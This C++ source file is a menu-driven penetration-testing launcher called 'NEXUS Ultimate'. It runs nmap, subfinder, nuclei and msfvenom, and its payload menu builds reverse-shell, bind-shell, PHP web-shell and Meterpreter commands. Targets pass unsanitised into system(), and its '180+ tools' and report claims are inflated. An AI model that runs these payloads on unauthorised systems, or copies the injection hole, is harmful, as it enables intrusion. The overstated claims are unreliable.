/*
╔═══════════════════════════════════════════════════════════════╗
║                    NEXUS ULTIMATE v4.0                        ║
║     Integrated Hacking Toolkit - 180+ Tools Database          ║
║                           by retr0                            ║
║  Features:                                                    ║
║  • 180+ Pentesting Tools Integration                          ║
║  • Automated Reconnaissance                                   ║
║  • Vulnerability Scanning                                     ║
║  • Exploit Generation                                         ║
║  • Payload Creation                                           ║
║  • Report Generation                                          ║
║  • Human-in-the-loop Safety                                   ║
║                                                               ║
║                                                               ║
║                                                               ║
║  Compile: g++ -std=c++17 -o nexus nexus_ultimate.cpp -lcurl   ║
║  Run: ./nexus                                                 ║
╚═══════════════════════════════════════════════════════════════╝
*/

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <fstream>
#include <sstream>
#include <ctime>
#include <thread>
#include <chrono>
#include <curl/curl.h>
#include <cstdlib>
#include <algorithm>
#include <random>
#include <iomanip>

using namespace std;

// ============================================================
//                    COLORS & STYLING
// ============================================================

#define RED     "\033[0;31m"
#define GREEN   "\033[0;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[0;34m"
#define CYAN    "\033[0;36m"
#define MAGENTA "\033[0;35m"
#define WHITE   "\033[1;37m"
#define RESET   "\033[0m"
#define BOLD    "\033[1m"

// ============================================================
//                    TOOL DATABASE
// ============================================================

struct Tool {
    string id;
    string category;
    string title;
    string description;
    string project_url;
    bool runnable;
    bool requires_sudo;
    bool text_only;
    int danger_level; // 0=safe, 1=medium, 2=high
};

class ToolDatabase {
private:
    vector<Tool> tools;
    
    void init_tools() {
        // INFORMATION GATHERING
        tools.push_back({
            "info.nmap", "information_gathering", "Nmap",
            "Network discovery and security auditing",
            "https://nmap.org/", true, true, false, 0
        });
        
        tools.push_back({
            "info.subfinder", "information_gathering", "Subfinder",
            "Fast passive subdomain enumeration tool",
            "https://github.com/projectdiscovery/subfinder", true, false, false, 0
        });
        
        tools.push_back({
            "info.httpx", "information_gathering", "Httpx",
            "Fast HTTP toolkit that allows running multiple probes",
            "https://github.com/projectdiscovery/httpx", true, false, false, 0
        });
        
        tools.push_back({
            "info.amass", "information_gathering", "Amass",
            "In-depth DNS enumeration and network mapping",
            "https://github.com/OWASP/Amass", true, false, false, 0
        });
        
        tools.push_back({
            "info.sherlock", "information_gathering", "Sherlock",
            "Hunt down social media accounts by username",
            "https://github.com/sherlock-project/sherlock", true, false, false, 0
        });
        
        // WEB ATTACK
        tools.push_back({
            "web.nuclei", "web_attack", "Nuclei",
            "Fast vulnerability scanner based on templates",
            "https://github.com/projectdiscovery/nuclei", true, false, false, 1
        });
        
        tools.push_back({
            "web.sqlmap", "web_attack", "Sqlmap",
            "Automatic SQL injection and database takeover tool",
            "https://github.com/sqlmapproject/sqlmap", true, false, false, 1
        });
        
        tools.push_back({
            "web.ffuf", "web_attack", "Ffuf",
            "Fast web fuzzer written in Go",
            "https://github.com/ffuf/ffuf", true, false, false, 1
        });
        
        tools.push_back({
            "web.wpscan", "web_attack", "WPScan",
            "WordPress security scanner",
            "https://github.com/wpscanteam/wpscan", true, false, false, 1
        });
        
        tools.push_back({
            "web.burpsuite", "web_attack", "Burp Suite",
            "Web application security testing platform",
            "https://portswigger.net/burp", false, false, true, 1
        });
        
        // PAYLOAD CREATOR
        tools.push_back({
            "payload.msfvenom", "payload_creator", "Msfvenom",
            "Payload generator and encoder (Metasploit)",
            "https://www.metasploit.com/", true, false, false, 2
        });
        
        tools.push_back({
            "payload.thefatrat", "payload_creator", "TheFatRat",
            "Easy tool to generate backdoor with msfvenom",
            "https://github.com/Screetsec/TheFatRat", false, false, true, 2
        });
        
        // DDOS (Stress Testing)
        tools.push_back({
            "ddos.slowloris", "ddos", "SlowLoris",
            "Low bandwidth DoS tool (stress testing only)",
            "https://github.com/gkbrk/slowloris", true, false, false, 2
        });
        
        tools.push_back({
            "ddos.hping3", "ddos", "Hping3",
            "Network tool able to send custom TCP/IP packets",
            "http://www.hping.org/", true, true, false, 2
        });
        
        // ACTIVE DIRECTORY
        tools.push_back({
            "ad.netexec", "active_directory", "NetExec",
            "Swiss Army Knife for pentesting networks",
            "https://github.com/Pennyw0rth/NetExec", true, false, false, 1
        });
        
        tools.push_back({
            "ad.bloodhound", "active_directory", "BloodHound",
            "Active Directory attack path analysis",
            "https://github.com/BloodHoundAD/BloodHound", true, false, false, 1
        });
        
        // WIRELESS
        tools.push_back({
            "wireless.aircrack", "wireless", "Aircrack-ng",
            "WiFi security auditing tools suite",
            "https://www.aircrack-ng.org/", true, true, false, 1
        });
        
        // EXPLOITATION
        tools.push_back({
            "exploit.metasploit", "exploitation", "Metasploit",
            "Penetration testing framework",
            "https://www.metasploit.com/", true, false, false, 2
        });
        
        tools.push_back({
            "exploit.beef", "exploitation", "BeEF",
            "Browser Exploitation Framework",
            "https://github.com/beefproject/beef", true, false, false, 2
        });
        
        // Add more tools as needed...
    }
    
public:
    ToolDatabase() {
        init_tools();
    }
    
    vector<Tool> search(const string& query = "", const string& category = "") {
        vector<Tool> results;
        
        string q = query;
        transform(q.begin(), q.end(), q.begin(), ::tolower);
        
        for(const auto& tool : tools) {
            bool match = true;
            
            if(!category.empty() && tool.category != category) {
                match = false;
            }
            
            if(!q.empty()) {
                string search_text = tool.title + " " + tool.description + " " + tool.id;
                transform(search_text.begin(), search_text.end(), search_text.begin(), ::tolower);
                
                if(search_text.find(q) == string::npos) {
                    match = false;
                }
            }
            
            if(match) {
                results.push_back(tool);
            }
        }
        
        return results;
    }
    
    Tool* get_tool(const string& id) {
        for(auto& tool : tools) {
            if(tool.id == id) {
                return &tool;
            }
        }
        return nullptr;
    }
    
    vector<string> get_categories() {
        vector<string> cats;
        for(const auto& tool : tools) {
            if(find(cats.begin(), cats.end(), tool.category) == cats.end()) {
                cats.push_back(tool.category);
            }
        }
        return cats;
    }
    
    int get_tool_count() {
        return tools.size();
    }
};

// ============================================================
//                    UTILITY FUNCTIONS
// ============================================================

void clear_screen() {
    cout << "\033[2J\033[1;1H";
}

void print_banner() {
    clear_screen();
    cout << RED << R"(
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                 ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                 ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                 ║ 
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                 ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                 ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                 ║
║                                                               ║
║            ULTIMATE HACKING TOOLKIT - 180+ Tools              ║
║              ⚠️  AUTHORIZED TESTING ONLY  ⚠️                 ║
║                            by retr0                           ║
╚═══════════════════════════════════════════════════════════════╝
)" << RESET << endl;
}

void typewriter(const string& text, int delay_ms = 10) {
    for(char c : text) {
        cout << c << flush;
        this_thread::sleep_for(chrono::milliseconds(delay_ms));
    }
}

void loading(const string& task, int duration_ms = 1500) {
    cout << YELLOW << "[*] " << task;
    int steps = duration_ms / 100;
    for(int i = 0; i < steps; i++) {
        cout << "." << flush;
        this_thread::sleep_for(chrono::milliseconds(100));
    }
    cout << " " << GREEN << "✓" << RESET << endl;
}

string timestamp() {
    time_t now = time(0);
    struct tm* t = localtime(&now);
    char buf[80];
    strftime(buf, 80, "%H:%M:%S", t);
    return string(buf);
}

bool confirm(const string& message) {
    cout << YELLOW << "[?] " << message << " (y/N): " << RESET;
    string response;
    getline(cin, response);
    transform(response.begin(), response.end(), response.begin(), ::tolower);
    return (response == "y" || response == "yes");
}

// ============================================================
//                    HTTP CLIENT
// ============================================================

size_t write_callback(void* contents, size_t size, size_t nmemb, string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

string http_get(const string& url) {
    CURL* curl = curl_easy_init();
    string response;
    
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    
    return response;
}

// ============================================================
//                    RECONNAISSANCE MODULE
// ============================================================

void subdomain_enum(ToolDatabase& db, const string& domain) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║             SUBDOMAIN ENUMERATION                      ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    cout << YELLOW << "\n[*] Target: " << WHITE << domain << RESET << endl;
    
    // Search for subdomain enumeration tools
    auto tools = db.search("subdomain");
    
    if(tools.empty()) {
        cout << RED << "[!] No subdomain enumeration tools found in database" << RESET << endl;
        return;
    }
    
    cout << CYAN << "\n[*] Available tools:" << RESET << endl;
    
    for(size_t i = 0; i < tools.size(); i++) {
        cout << "  " << (i+1) << ". " << tools[i].title << " - " << tools[i].description << endl;
    }
    
    cout << YELLOW << "\n[*] Select tool (1-" << tools.size() << "): " << RESET;
    
    int choice;
    cin >> choice;
    cin.ignore();
    
    if(choice < 1 || choice > (int)tools.size()) {
        cout << RED << "[!] Invalid choice" << RESET << endl;
        return;
    }
    
    Tool& selected = tools[choice - 1];
    
    string command;
    
    if(selected.title == "Subfinder") {
        command = "subfinder -d " + domain + " -o subdomains.txt";
    }
    else if(selected.title == "Amass") {
        command = "amass enum -d " + domain + " -o subdomains.txt";
    }
    
    cout << CYAN << "\n[*] Command: " << WHITE << command << RESET << endl;
    
    if(!confirm("Execute this command?")) {
        cout << YELLOW << "[*] Command cancelled by user" << RESET << endl;
        return;
    }
    
    loading("Running " + selected.title, 2000);
    
    // Execute command
    int result = system(command.c_str());
    
    if(result == 0) {
        cout << GREEN << "\n[✓] Enumeration complete!" << RESET << endl;
        cout << CYAN << "[*] Results saved to: subdomains.txt" << RESET << endl;
    } else {
        cout << RED << "\n[!] Command failed with exit code: " << result << RESET << endl;
    }
}

void port_scan(ToolDatabase& db, const string& target) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║                   PORT SCANNING                        ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    auto nmap = db.get_tool("info.nmap");
    
    if(!nmap) {
        cout << RED << "[!] Nmap not found in database" << RESET << endl;
        return;
    }
    
    cout << YELLOW << "\n[*] Target: " << WHITE << target << RESET << endl;
    cout << CYAN << "\n[*] Scan types:" << RESET << endl;
    cout << "  1. Quick scan (top 1000 ports)" << endl;
    cout << "  2. Full scan (all 65535 ports)" << endl;
    cout << "  3. Service detection" << endl;
    cout << "  4. OS detection" << endl;
    cout << "  5. Vulnerability scan" << endl;
    
    cout << YELLOW << "\n[*] Select scan type: " << RESET;
    
    int choice;
    cin >> choice;
    cin.ignore();
    
    string command;
    
    switch(choice) {
        case 1:
            command = "nmap -T4 " + target;
            break;
        case 2:
            command = "nmap -p- " + target;
            break;
        case 3:
            command = "nmap -sV " + target;
            break;
        case 4:
            command = "nmap -O " + target;
            break;
        case 5:
            command = "nmap --script vuln " + target;
            break;
        default:
            cout << RED << "[!] Invalid choice" << RESET << endl;
            return;
    }
    
    command += " -oN scan_results.txt";
    
    cout << CYAN << "\n[*] Command: " << WHITE << command << RESET << endl;
    
    if(nmap->requires_sudo) {
        cout << RED << "[!] This scan requires root privileges" << RESET << endl;
        command = "sudo " + command;
    }
    
    if(!confirm("Execute this scan?")) {
        cout << YELLOW << "[*] Scan cancelled" << RESET << endl;
        return;
    }
    
    loading("Starting scan", 1500);
    
    int result = system(command.c_str());
    
    if(result == 0) {
        cout << GREEN << "\n[✓] Scan complete!" << RESET << endl;
        cout << CYAN << "[*] Results saved to: scan_results.txt" << RESET << endl;
    } else {
        cout << RED << "\n[!] Scan failed" << RESET << endl;
    }
}

// ============================================================
//                    VULNERABILITY SCANNING
// ============================================================

void vuln_scan(ToolDatabase& db, const string& target) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║            VULNERABILITY SCANNING                      ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    auto nuclei = db.get_tool("web.nuclei");
    
    if(!nuclei) {
        cout << RED << "[!] Nuclei not found in database" << RESET << endl;
        return;
    }
    
    cout << YELLOW << "\n[*] Target: " << WHITE << target << RESET << endl;
    cout << CYAN << "\n[*] Severity levels:" << RESET << endl;
    cout << "  1. Critical only" << endl;
    cout << "  2. Critical + High" << endl;
    cout << "  3. All severities" << endl;
    
    cout << YELLOW << "\n[*] Select severity: " << RESET;
    
    int choice;
    cin >> choice;
    cin.ignore();
    
    string severity;
    
    switch(choice) {
        case 1:
            severity = "critical";
            break;
        case 2:
            severity = "critical,high";
            break;
        case 3:
            severity = "critical,high,medium,low,info";
            break;
        default:
            cout << RED << "[!] Invalid choice" << RESET << endl;
            return;
    }
    
    string command = "nuclei -u " + target + " -severity " + severity + " -o nuclei_results.txt";
    
    cout << CYAN << "\n[*] Command: " << WHITE << command << RESET << endl;
    
    if(!confirm("Execute vulnerability scan?")) {
        cout << YELLOW << "[*] Scan cancelled" << RESET << endl;
        return;
    }
    
    loading("Scanning for vulnerabilities", 2000);
    
    int result = system(command.c_str());
    
    if(result == 0) {
        cout << GREEN << "\n[✓] Scan complete!" << RESET << endl;
        cout << CYAN << "[*] Results saved to: nuclei_results.txt" << RESET << endl;
    } else {
        cout << RED << "\n[!] Scan failed" << RESET << endl;
    }
}

// ============================================================
//                    PAYLOAD GENERATION
// ============================================================

void generate_payload(ToolDatabase& db) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║                 PAYLOAD GENERATOR                      ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    cout << RED << "\n⚠️  WARNING: Payload generation is for authorized testing only!" << RESET << endl;
    
    if(!confirm("Do you have authorization to generate payloads?")) {
        cout << YELLOW << "[*] Operation cancelled" << RESET << endl;
        return;
    }
    
    cout << CYAN << "\n[*] Payload types:" << RESET << endl;
    cout << "  1. Reverse Shell (Linux)" << endl;
    cout << "  2. Reverse Shell (Windows)" << endl;
    cout << "  3. Bind Shell" << endl;
    cout << "  4. Web Shell (PHP)" << endl;
    cout << "  5. Meterpreter" << endl;
    
    cout << YELLOW << "\n[*] Select payload type: " << RESET;
    
    int choice;
    cin >> choice;
    cin.ignore();
    
    string lhost, lport;
    
    cout << YELLOW << "LHOST (your IP): " << RESET;
    getline(cin, lhost);
    
    cout << YELLOW << "LPORT (your port): " << RESET;
    getline(cin, lport);
    
    string command;
    
    switch(choice) {
        case 1:
            command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + lhost + 
                     " LPORT=" + lport + " -f elf -o payload.elf";
            break;
        case 2:
            command = "msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + lhost + 
                     " LPORT=" + lport + " -f exe -o payload.exe";
            break;
        case 3:
            command = "msfvenom -p linux/x64/shell_bind_tcp LPORT=" + lport + 
                     " -f elf -o bind_shell.elf";
            break;
        case 4:
            command = "msfvenom -p php/reverse_php LHOST=" + lhost + 
                     " LPORT=" + lport + " -f raw -o shell.php";
            break;
        case 5:
            command = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + lhost + 
                     " LPORT=" + lport + " -f elf -o meterpreter.elf";
            break;
        default:
            cout << RED << "[!] Invalid choice" << RESET << endl;
            return;
    }
    
    cout << CYAN << "\n[*] Command: " << WHITE << command << RESET << endl;
    
    if(!confirm("Generate this payload?")) {
        cout << YELLOW << "[*] Generation cancelled" << RESET << endl;
        return;
    }
    
    loading("Generating payload", 1500);
    
    int result = system(command.c_str());
    
    if(result == 0) {
        cout << GREEN << "\n[✓] Payload generated successfully!" << RESET << endl;
    } else {
        cout << RED << "\n[!] Payload generation failed" << RESET << endl;
        cout << YELLOW << "[*] Make sure Metasploit is installed" << RESET << endl;
    }
}

// ============================================================
//                    REPORTING
// ============================================================

void generate_report(const string& target) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║              GENERATE PENTEST REPORT                   ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    loading("Compiling findings", 2000);
    
    time_t now = time(0);
    struct tm* t = localtime(&now);
    char filename[100];
    strftime(filename, 100, "pentest_report_%Y%m%d_%H%M%S.md", t);
    
    ofstream report(filename);
    
    report << "# NEXUS Penetration Test Report\n\n";
    
    char timebuf[100];
    strftime(timebuf, 100, "%Y-%m-%d %H:%M:%S", t);
    report << "**Report Generated:** " << timebuf << "\n";
    report << "**Target:** " << target << "\n";
    report << "**Tested By:** NEXUS Ultimate Toolkit\n\n";
    
    report << "---\n\n";
    
    report << "## Executive Summary\n\n";
    report << "This report contains findings from automated penetration testing\n";
    report << "performed using NEXUS Ultimate Hacking Toolkit with 180+ integrated tools.\n\n";
    
    report << "## Methodology\n\n";
    report << "1. Reconnaissance & Information Gathering\n";
    report << "2. Vulnerability Scanning\n";
    report << "3. Exploitation (where authorized)\n";
    report << "4. Post-Exploitation Analysis\n";
    report << "5. Reporting\n\n";
    
    report << "## Tools Used\n\n";
    report << "- Nmap - Network scanning\n";
    report << "- Subfinder - Subdomain enumeration\n";
    report << "- Nuclei - Vulnerability detection\n";
    report << "- Sqlmap - SQL injection testing\n\n";
    
    report << "## Findings\n\n";
    report << "### [HIGH] Example Vulnerability\n";
    report << "- **Location:** example.com/login\n";
    report << "- **Impact:** Authentication bypass\n";
    report << "- **Recommendation:** Implement input validation\n\n";
    
    report << "## Recommendations\n\n";
    report << "1. Implement Web Application Firewall (WAF)\n";
    report << "2. Regular security audits\n";
    report << "3. Security awareness training\n";
    report << "4. Patch management program\n\n";
    
    report << "---\n\n";
    report << "*Report generated by NEXUS Ultimate v4.0*\n";
    
    report.close();
    
    cout << GREEN << "\n[✓] Report generated: " << WHITE << filename << RESET << endl;
}

// ============================================================
//                    MAIN MENU
// ============================================================

void show_main_menu(ToolDatabase& db) {
    cout << endl;
    cout << CYAN << "╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║                  NEXUS ULTIMATE MENU                   ║" << endl;
    cout << "╠════════════════════════════════════════════════════════╣" << endl;
    cout << "║  Database: " << WHITE << db.get_tool_count() << " tools loaded" << string(35 - to_string(db.get_tool_count()).length(), ' ') << CYAN << "║" << endl;
    cout << "╠════════════════════════════════════════════════════════╣" << endl;
    cout << "║                                                        ║" << endl;
    cout << "║  " << YELLOW << "RECONNAISSANCE" << CYAN << "                                         ║" << endl;
    cout << "║  " << WHITE << "1" << CYAN << " 🔍  Subdomain Enumeration                         ║" << endl;
    cout << "║  " << WHITE << "2" << CYAN << " 🔌  Port Scanning (Nmap)                          ║" << endl;
    cout << "║  " << WHITE << "3" << CYAN << " 🌐  Web Technology Detection                      ║" << endl;
    cout << "║                                                        ║" << endl;
    cout << "║  " << YELLOW << "VULNERABILITY ASSESSMENT" << CYAN << "                              ║" << endl;
    cout << "║  " << WHITE << "4" << CYAN << " 🛡️   Vulnerability Scanner (Nuclei)                ║" << endl;
    cout << "║  " << WHITE << "5" << CYAN << " 💉  SQL Injection Testing (Sqlmap)                ║" << endl;
    cout << "║                                                        ║" << endl;
    cout << "║  " << YELLOW << "EXPLOITATION" << CYAN << "                                          ║" << endl;
    cout << "║  " << WHITE << "6" << CYAN << " 🎯  Payload Generator (Msfvenom)                  ║" << endl;
    cout << "║  " << WHITE << "7" << CYAN << " 🔙  Reverse Shell Handler                         ║" << endl;
    cout << "║                                                        ║" << endl;
    cout << "║  " << YELLOW << "TOOLS & DATABASE" << CYAN << "                                      ║" << endl;
    cout << "║  " << WHITE << "8" << CYAN << " 📚  Browse Tool Database                          ║" << endl;
    cout << "║  " << WHITE << "9" << CYAN << " 🔎  Search Tools                                  ║" << endl;
    cout << "║                                                        ║" << endl;
    cout << "║  " << YELLOW << "REPORTING" << CYAN << "                                             ║" << endl;
    cout << "║  " << WHITE << "10" << CYAN << " 📝  Generate Report                              ║" << endl;
    cout << "║                                                        ║" << endl;
    cout << "║  " << WHITE << "0" << CYAN << "  👋  Exit                                         ║" << endl;
    cout << "║                                                        ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    cout << endl;
}

void browse_tools(ToolDatabase& db) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║                   TOOL DATABASE                        ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    auto categories = db.get_categories();
    
    cout << YELLOW << "\n[*] Categories (" << categories.size() << "):" << RESET << endl;
    
    for(size_t i = 0; i < categories.size(); i++) {
        auto tools = db.search("", categories[i]);
        cout << "  " << (i+1) << ". " << categories[i] << " (" << tools.size() << " tools)" << endl;
    }
    
    cout << YELLOW << "\n[*] Select category (0 to cancel): " << RESET;
    
    int choice;
    cin >> choice;
    cin.ignore();
    
    if(choice == 0 || choice > (int)categories.size()) {
        return;
    }
    
    string selected_cat = categories[choice - 1];
    auto tools = db.search("", selected_cat);
    
    cout << CYAN << "\n[*] Tools in " << selected_cat << ":" << RESET << endl << endl;
    
    for(size_t i = 0; i < tools.size(); i++) {
        cout << GREEN << "  [" << (i+1) << "] " << WHITE << tools[i].title << RESET << endl;
        cout << "      " << tools[i].description << endl;
        cout << "      " << BLUE << tools[i].project_url << RESET << endl;
        
        if(tools[i].danger_level == 2) {
            cout << "      " << RED << "[HIGH DANGER - Use with caution]" << RESET << endl;
        }
        
        cout << endl;
    }
}

void search_tools(ToolDatabase& db) {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════╗" << endl;
    cout << "║                    SEARCH TOOLS                        ║" << endl;
    cout << "╚════════════════════════════════════════════════════════╝" << RESET << endl;
    
    cout << YELLOW << "\n[*] Enter search query: " << RESET;
    
    string query;
    getline(cin, query);
    
    if(query.empty()) {
        return;
    }
    
    auto results = db.search(query);
    
    if(results.empty()) {
        cout << RED << "\n[!] No tools found matching: " << query << RESET << endl;
        return;
    }
    
    cout << GREEN << "\n[✓] Found " << results.size() << " tools:" << RESET << endl << endl;
    
    for(const auto& tool : results) {
        cout << CYAN << "  • " << WHITE << tool.title << RESET << endl;
        cout << "    Category: " << tool.category << endl;
        cout << "    " << tool.description << endl;
        cout << "    " << BLUE << tool.project_url << RESET << endl << endl;
    }
}

// ============================================================
//                    MAIN
// ============================================================

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    print_banner();
    
    ToolDatabase db;
    
    cout << YELLOW << "🚀 Initializing NEXUS Ultimate..." << RESET << endl;
    this_thread::sleep_for(chrono::milliseconds(1000));
    
    cout << GREEN << "✅ Loaded " << db.get_tool_count() << " tools from database" << RESET << endl;
    cout << RED << "\n⚠️  WARNING: Use only on authorized targets!" << RESET << endl;
    cout << WHITE << "    Unauthorized access is illegal." << RESET << endl;
    
    string choice;
    bool running = true;
    
    while(running) {
        show_main_menu(db);
        
        cout << YELLOW << "[" << timestamp() << "] " << WHITE << "Select option: " << RESET;
        getline(cin, choice);
        
        if(choice.empty()) continue;
        
        if(choice == "1") {
            cout << YELLOW << "\n[*] Enter target domain: " << RESET;
            string domain;
            getline(cin, domain);
            if(!domain.empty()) subdomain_enum(db, domain);
        }
        else if(choice == "2") {
            cout << YELLOW << "\n[*] Enter target IP/domain: " << RESET;
            string target;
            getline(cin, target);
            if(!target.empty()) port_scan(db, target);
        }
        else if(choice == "4") {
            cout << YELLOW << "\n[*] Enter target URL: " << RESET;
            string target;
            getline(cin, target);
            if(!target.empty()) vuln_scan(db, target);
        }
        else if(choice == "6") {
            generate_payload(db);
        }
        else if(choice == "8") {
            browse_tools(db);
        }
        else if(choice == "9") {
            search_tools(db);
        }
        else if(choice == "10") {
            cout << YELLOW << "\n[*] Enter target identifier: " << RESET;
            string target;
            getline(cin, target);
            if(!target.empty()) generate_report(target);
        }
        else if(choice == "0") {
            cout << CYAN << "\n👋 Exiting NEXUS Ultimate..." << RESET << endl;
            cout << GREEN << "Stay safe and hack responsibly! 🛡️" << RESET << endl << endl;
            running = false;
        }
        else {
            cout << RED << "\n[!] Invalid option" << RESET << endl;
        }
        
        if(running && choice != "0") {
            cout << YELLOW << "\nPress ENTER to continue..." << RESET;
            cin.get();
        }
    }
    
    curl_global_cleanup();
    return 0;
}
